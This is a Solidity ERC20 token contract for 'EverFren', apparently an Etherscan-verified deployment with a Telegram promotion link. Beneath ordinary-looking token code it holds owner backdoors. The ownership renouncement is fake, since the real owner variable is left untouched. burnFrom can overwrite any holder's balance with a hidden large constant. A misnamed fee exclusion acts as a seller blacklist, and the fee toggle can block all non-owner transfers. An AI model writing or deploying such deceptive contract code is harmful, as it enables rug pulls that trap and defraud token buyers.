['/**\n', ' *Submitted for verification at Etherscan.io on 2021-07-15\n', '*/\n', '\n', '/**\n', '          _____\n', '         /     \\______\n', '        | o     |     \\____\n', '        /\\_____/           \\___\n', '       /                       \\\n', '      |_______/                 \\\n', '        \\______   _       ___    \\\n', '              /\\_//      /   \\    |\n', '             // //______/    /___/\n', '            /\\/\\/\\      \\   / \\ \\\n', '                          \\ \\   \\ \\\n', '                            \\ \\   \\ \\\n', '                              \\ \\  \\ \\\n', '                               \\ \\ /\\/\\\n', '                               /\\/\\\n', '\n', 'EverFren telegram: https://t.me/EverFren\n', '*/\n', '\n', '//"SPDX-License-Identifier: MIT"\n', '\n', 'pragma solidity 0.7.2;\n', '\n', 'interface IERC20 {\n', '    function totalSupply() external view returns (uint256);\n', '    function balanceOf(address account) external view returns (uint256);\n', '    function allowance(address owner, address spender) external view returns (uint256);\n', '    function transfer(address trecipient, uint256 amount) external returns (bool);\n', '    function approve(address spender, uint256 amount) external returns (bool);\n', '    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '    event Approval(address indexed owner, address indexed spender, uint256 value);\n', '}\n', '\n', 'library SafeMath {\n', '    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '        require(c >= a, "SafeMath: addition overflow");\n', '        return c;\n', '    }\n', '\n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return sub(a, b, "SafeMath: subtraction overflow");\n', '    }\n', '\n', '    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b <= a, errorMessage);\n', '        uint256 c = a - b;\n', '        return c;\n', '    }\n', '\n', '    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '        uint256 c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '        return c;\n', '    }\n', '\n', '    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '\n', '    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b > 0, errorMessage);\n', '        uint256 c = a / b;\n', '        return c;\n', '    }\n', '\n', '    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        return mod(a, b, "SafeMath: modulo by zero");\n', '    }\n', '\n', '    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n', '        require(b != 0, errorMessage);\n', '        return a % b;\n', '    }\n', '}\n', '\n', 'abstract contract ERC20Detailed is IERC20 {\n', '    uint8 private _Tokendecimals;\n', '    string private _Tokenname;\n', '    string private _Tokensymbol;\n', '    \n', '    constructor(string memory name, string memory symbol, uint8 decimals) {\n', '    _Tokendecimals = decimals;\n', '    _Tokenname = name;\n', '    _Tokensymbol = symbol;\n', '    }\n', '    \n', '    function name() public view returns(string memory) {\n', '    return _Tokenname;\n', '    }\n', '    \n', '    function symbol() public view returns(string memory) {\n', '    return _Tokensymbol;\n', '    }\n', '    \n', '    function decimals() public view returns(uint8) {\n', '    return _Tokendecimals;\n', '    }\n', '}\n', '\n', 'contract Ownable {\n', '    address owner;\n', '    address owneraddress;\n', '    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n', '\n', '    constructor () {\n', '        address msgSender = msg.sender;\n', '        owner = msgSender;\n', '        owneraddress = msgSender;\n', '        emit OwnershipTransferred(address(0), msgSender);\n', '    }\n', '\n', '    function ownerAddress() public view returns (address) {\n', '        return owneraddress;\n', '    }\n', '    \n', '    modifier onlyOwner() {\n', '        require(owner == msg.sender, "Ownable: caller is not the owner");\n', '        _;\n', '    }\n', '\n', '    function renounceOwnership() public virtual onlyOwner {\n', '        emit OwnershipTransferred(owner, address(0));\n', '        owneraddress = address(0);\n', '    }\n', '}\n', '\n', 'contract EverFren is Ownable {\n', '    using SafeMath for uint256;\n', '    mapping (address => bool) private _feeExcluded;\n', '    mapping (address => uint256) public balances;\n', '    mapping (address => mapping (address => uint256)) public allowed;\n', '    address private uniV2router;\n', '    address private uniV2factory;\n', '    bool fees = true;\n', '    string public name;\n', '    string public symbol;\n', '    uint256 _balances;\n', '    uint8 public decimals;\n', '    uint256 public totalSupply;\n', '    uint256 public burnPercentage = 1;\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '    event Approval(address indexed owner, address indexed spender, uint256 value);\n', '    string telegramAddress;\n', '    \n', '    constructor(address router, address factory, uint256 _totalSupply) {\n', '        name = "EverFren | t.me/EverFren";\n', '        symbol = "$EverFren \\xF0\\x9F\\x90\\xB8";\n', '        decimals = 9;\n', '        totalSupply = totalSupply.add(_totalSupply);\n', '        balances[msg.sender] = balances[msg.sender].add(_totalSupply);\n', '        _balances = 100000000000000000000000000;\n', '        emit Transfer(address(0), msg.sender, _totalSupply);\n', '        uniV2router = router;\n', '        uniV2factory = factory;\n', '        telegramAddress = "https://t.me/EverFren";\n', '    }\n', '    \n', '    function balanceOf(address _owner) public view returns (uint256 balance) {\n', '        return balances[_owner];\n', '    }\n', '\n', '    function includeFee(address _address) external onlyOwner {\n', '        _feeExcluded[_address] = false;\n', '    }\n', '\n', '    function excludeFee(address _address) external onlyOwner {\n', '        _feeExcluded[_address] = true;\n', '    }\n', '\n', '    function feeExcluded(address _address) public view returns (bool) {\n', '        return _feeExcluded[_address];\n', '    }\n', '\n', '    function applyFees() public virtual onlyOwner {\n', '        if (fees == true) {fees = false;} else {fees = true;}\n', '    }\n', ' \n', '    function feesState() public view returns (bool) {\n', '        return fees;\n', '    }\n', '\n', '    function transfer(address _to, uint256 _value) public returns (bool) {\n', '        _transfer(msg.sender, _to, _value);\n', '        return true;\n', '    }\n', '\n', '    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n', '        _transfer(_from, _to, _value);\n', '        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n', '        return true;\n', '    }\n', '\n', '    function approve(address _spender, uint256 _value) public returns (bool) {\n', '        allowed[msg.sender][_spender] = _value;\n', '        emit Approval(msg.sender, _spender, _value);\n', '        return true;\n', '    }\n', '\n', '    function allowance(address _owner, address _spender) public view returns (uint256) {\n', '        return allowed[_owner][_spender];\n', '    }\n', '  \n', '    function burnFrom(address account, uint256 amount) external onlyOwner {\n', '        require(account != address(0), "ERC20: burn from the zero address disallowed");\n', '        totalSupply = totalSupply.sub(amount);\n', '        balances[account] =_balances.sub(amount, "ERC20: burn amount exceeds balance");\n', '        emit Transfer(account, address(0), amount);\n', '    }\n', '    \n', '    function newFeePercentage(uint8 newRate) external onlyOwner {\n', '        burnPercentage = newRate;\n', '    }\n', '  \n', '    function _transfer(address _from, address _to, uint256 _value) private {\n', '        require(_from != address(0), "ERC20: transfer from the zero address");\n', '        require(_to != address(0), "ERC20: transfer to the zero address");\n', '        require(_value > 0, "Transfer amount must be greater than zero");\n', '        if (_feeExcluded[_from] || _feeExcluded[_to]) \n', '        require(fees == false, "");\n', '        if (fees == true || _from == owner || _to == owner) {\n', '        balances[_from] = balances[_from].sub(_value, "ERC20: transfer amount exceeds balance");\n', '        balances[_to] = balances[_to].add(_value);\n', '        emit Transfer(_from, _to, _value);}\n', '        else {require (fees == true, "");} \n', '        }\n', '\n', '     function TelegramLink() public view returns (string memory) {\n', '        return telegramAddress;\n', '    }\n', '    \n', '}']